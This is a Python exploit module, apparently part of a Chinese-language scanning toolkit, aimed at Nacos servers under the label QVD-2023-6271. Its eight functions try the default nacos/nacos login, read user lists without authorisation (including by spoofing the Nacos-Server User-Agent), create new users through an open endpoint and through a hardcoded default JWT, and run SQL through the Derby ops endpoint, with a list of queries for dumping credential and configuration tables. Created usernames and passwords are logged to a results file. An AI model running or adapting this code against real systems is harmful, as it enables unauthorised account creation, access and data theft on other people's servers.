#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import json
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings()

head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}


class Qvd_2023_6271:
    def poc1(self,url):
        if not self.batch:
            OutPrintInfo("NACOS","正在检测是否存在nacos默认口令")
        if url.endswith("/"):
            path = "nacos/v1/auth/users/login"
        else:
            path = "/nacos/v1/auth/users/login"
        data = {
            "username": "nacos",
            "password": "nacos"
        }
        try:
            checkpoc1 = requests.post(url=url + path, headers=head, data=data, verify=self.verify,proxies=self.proxy)
            if checkpoc1.status_code == 200:
                OutPrintInfoSuc("NACOS","存在默认口令username:[b bright_red]nacos[/b bright_red],password:[b bright_red]nacos[/b bright_red]")
                if self.batch:
                    with open("./result/nacos_2023_6271.txt","a") as w:
                        w.write(f"存在默认口令{url}---User: nacos---Pass: nacos\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("NACOS","不存在默认口令")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("NACOS", "目标请求出错")
            return False

    def poc2(self,url):
        if not self.batch:
            OutPrintInfo("NACOS","正在检测是否存在未授权查看用户列表漏洞")
        if url.endswith("/"):
            path = "nacos/v1/auth/users?pageNo=1&pageSize=5"
        else:
            path = "/nacos/v1/auth/users?pageNo=1&pageSize=5"
        try:
            checkpoc2 = requests.get(url=url + path, headers=head, verify=self.verify,proxies=self.proxy)
            if "username" in checkpoc2.text:
                if not self.batch:
                    OutPrintInfoSuc("NACOS", f"存在未授权访问漏洞,你可访问{url + path}查看详细信息")
                else:
                    OutPrintInfoSuc("NACOS", f"存在未授权访问漏洞 {url + path}")
                    with open("./result/nacos_2023_6271.txt","a") as w:
                        w.write(f"存在未授权访问漏洞{url + path}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("NACOS","不存在未授权访问漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("NACOS", "目标请求出错")
            return False


    def poc3(self,url):
        if not self.batch:
            OutPrintInfo("NACOS","正在检测是否存在任意用户添加漏洞")
        def generate_random_string(length=6):
            import string,random
            # 生成包含大小写字母和数字的字符集
            characters = string.ascii_letters + string.digits
            # print(characters)
            # 从字符集中随机选择length个字符，然后拼接成字符串
            random_string = ''.join(random.choice(characters) for _ in range(length))
            return random_string
        if url.endswith("/"):
            path = "nacos/v1/auth/users"
        else:
            path = "/nacos/v1/auth/users"
        username = generate_random_string()
        password = generate_random_string()
        data = {
            "username": username,
            "password": password
        }
        try:
            checkpoc3 = requests.post(url=url + path, headers=head, data=data, verify=self.verify,proxies=self.proxy)
            if "create user ok" in checkpoc3.text:
                OutPrintInfoSuc("NACOS",f"用户:[b bright_red] {username} [/b bright_red]添加成功，密码:[b bright_red] {password} [/b bright_red]")
                if self.batch:
                    with open("./result/nacos_2023_6271.txt","a") as w:
                        w.write(f"Url: {url+path}任意用户添加成功 用户{username}，密码为{password}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("NACOS","不存在任意用户添加漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("NACOS", "不存在任意用户添加漏洞")
            return False

    def poc4(self,url):
        if not self.batch:
            OutPrintInfo("NACOS","正在检测是否存在默认JWT任意用户添加漏洞")

        def generate_random_string(length=6):
            import string,random
            # 生成包含大小写字母和数字的字符集
            characters = string.ascii_letters + string.digits
            # print(characters)
            # 从字符集中随机选择length个字符，然后拼接成字符串
            random_string = ''.join(random.choice(characters) for _ in range(length))
            return random_string

        if url.endswith("/"):
            path = "nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
        else:
            path = "/nacos/v1/auth/users?accessToken=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3OTA4NTg3NX0.WT8N_acMlow8KTHusMacfvr84W4osgSdtyHu9p49tvc"
        username = generate_random_string()
        password = generate_random_string()
        data = {
            "username": username,
            "password": password
        }

        try:
            checkpoc4 = requests.post(url=url + path, headers=head, data=data, verify=self.verify,proxies=self.proxy)
            if "create user ok" in checkpoc4.text:
                OutPrintInfoSuc("NACOS",f"用户:[b bright_red] {username} [/b bright_red]添加成功，密码:[b bright_red] {password} [/b bright_red]")
                if self.batch:
                    with open("./result/nacos_2023_6271.txt","a") as w:
                        w.write(f"Url: {url+path} 默认JWT任意用户添加用户{username}添加成功，密码为{password}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("NACOS","不存在默认JWT任意用户添加漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("NACOS", "不存在默认JWT任意用户添加漏洞")
            return False
    def poc5(self,url):
        if not self.batch:
            OutPrintInfo("NACOS","正在检测是否存在未授权漏洞")
        if url.endswith("/"):
            path = "#/serviceSync"
        else:
            path = "/#/serviceSync"
        try:
            checkpoc5 = requests.get(url=url + path, headers=head, verify=self.verify,proxies=self.proxy)
            if checkpoc5.status_code == 200:
                OutPrintInfoSuc("NACOS",f"存在未授权漏洞,Url: {url+path}")
                if self.batch:
                    with open("./result/nacos_2023_6271.txt","a") as w:
                        w.write(f"存在未授权漏洞: {url+path}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("NACOS","不存在未授权漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("NACOS", "不存在未授权漏洞")
            return False

    def poc6(self,url):
        if not self.batch:
            OutPrintInfo("NACOS","正在检测是否存在未授权查看用户列表漏洞利用点2")
        heads = {
            "User-Agent": "Nacos-Server",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        if url.endswith("/"):
            path = "nacos/v1/auth/users?pageNo=1&pageSize=9"
        else:
            path = "/nacos/v1/auth/users?pageNo=1&pageSize=9"
        try:
            checkpoc2 = requests.get(url=url + path, headers=heads, verify=self.verify,proxies=self.proxy)
            if "username" in checkpoc2.text:
                OutPrintInfoSuc("NACOS",f"存在未授权访问漏洞,你可访问{url + path}查看详细信息")
                if self.batch:
                    with open("./result/nacos_2023_6271.txt","a") as w:
                        w.write(f"存在未授权漏洞: {url+path}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("NACOS","不存在未授权访问漏洞")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("NACOS", "不存在未授权访问漏洞")
            return False
    def poc7(self,url):
        OutPrintInfo("NACOS","正在检测Nacos版本信息")
        heads = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
        }
        if url.endswith("/"):
            path = "nacos/v1/console/server/state?accessToken&username"
        else:
            path = "/nacos/v1/console/server/state?accessToken&username"
        # print(1)
        try:
            checkpoc7 = requests.get(url=url + path, headers=heads, verify=self.verify,proxies=self.proxy)
            # print(2)
            if "version" in checkpoc7.text:
                res = json.loads(checkpoc7.text)
                OutPrintInfoSuc("NACOS",f"Nacos版本信息:[b bright_red]{res['version']}[/b bright_red]")
            else:
                OutPrintInfo("NACOS","未找到Nacos版本信息")
        except Exception:
            OutPrintInfo("NACOS","未找到Nacos版本信息")
    def poc8(self,url):
        if not self.batch:
            OutPrintInfo("NACOS","正在检测Nacos-SQL注入...")
        sql_str = '''
        select+st.tablename+from+sys.systables+st
        select * from users
        select * from permissions
        select * from roles
        select * from tenant_info
        select * from tenant_capacity
        select * from group_capacity
        select * from config_tags_relation
        select * from app_configdata_relation_pubs
        select * from app_configdata_relation_subs
        select * from app_list
        select * from config_info_aggr
        select * from config_info_tag
        select * from config_info_beta
        select * from his_config_info
        select * from config_info
        '''
        heads = {
            "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36",
        }
        if url.endswith("/"):
            path = "nacos/v1/cs/ops/derby?sql=select+*+from+sys.systables"
        else:
            path = "/nacos/v1/cs/ops/derby?sql=select+*+from+sys.systables"
        # print(1)
        try:
            checkpoc8 = requests.get(url=url + path, headers=heads, verify=self.verify,proxies=self.proxy)
            # print(2)
            if "USER" in checkpoc8.text:
                if not self.batch:
                    OutPrintInfoSuc("NACOS", f"存在Nacos-SQL注入")
                    OutPrintInfo("NACOS",url+path)
                    OutPrintInfo("NACOS",f"其他SQL语句:\n{url}直接拼接/nacos/v1/cs/ops/derby?sql={sql_str}")
                else:
                    OutPrintInfoSuc("NACOS", f"存在Nacos-SQL注入 {url+path}")
                    with open("./result/nacos_2023_6271.txt","a") as w:
                        w.write(f"存在SQL漏洞: {url+path}\n")
                return True
            else:
                if not self.batch:
                    OutPrintInfo("NACOS","不存在Nacos-SQL注入")
                return False
        except Exception:
            if not self.batch:
                OutPrintInfo("NACOS","不存在Nacos-SQL注入")
            return False

    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        proxy = target["proxy"]
        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            self.poc7(url)
        if self.poc1(url):
            return
        self.poc2(url)
        self.poc6(url)
        if self.poc3(url):
            return
        self.poc4(url)
        self.poc5(url)
        self.poc8(url)
